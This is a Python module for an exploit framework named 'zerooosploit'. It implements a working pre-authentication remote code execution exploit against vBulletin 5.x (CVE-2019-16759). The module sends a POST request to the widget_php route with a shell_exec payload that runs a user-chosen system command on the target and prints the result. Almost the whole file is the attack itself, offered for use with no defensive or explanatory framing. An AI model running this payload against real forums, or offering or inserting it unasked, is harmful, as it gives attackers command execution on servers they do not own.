from zerooosploit.exploits import ExploitAggregate
from zerooosploit.httpclient import HttpClient
from zerooosploit.color import *


class Zerooosploit(ExploitAggregate):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': 'vBulletin 5.x pre-auth RCE',
            'Module': 'exploits/vbulletin/cve-2019-16759',
            'Product': 'vBulletin',
            'Cve': 'cve-2019-16759',
            'Create_date': '2019-09-30',
            'Description': '',
            'Authors': '01sec',
            'References': ''
        }

        self.option = {
            'url': {'Current Setting': 'http://127.0.0.1:8080/', 'Required': 'yes', 'Description': 'The target url'},
            'command': {'Current Setting': 'whoami', 'Required': 'no', 'Description': 'Execute system commands'},
            # 'code': {'Current Setting': 'phpinfo()', 'Required': 'no', 'Description': 'Execute custom php code'}
        }

    def exploit(self):
        url = self.get_options('url')
        command = self.get_options('command')
        # code = self.get_options('code')
        payload = '''routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec('{0}')'''.format(command)
        print_blue('[*] {0}'.format(url))
        res = HttpClient().send_request_cgi(method='POST', url=url, data=payload)
        if res:
            if res.status_code == 200:
                print_green(res.text)
                print_green('[+] Exploit succeed')
            else:
                print_red('[-] {0} {1}'.format(url, res.status_code))

        print_blue('[*] Exploit completed')
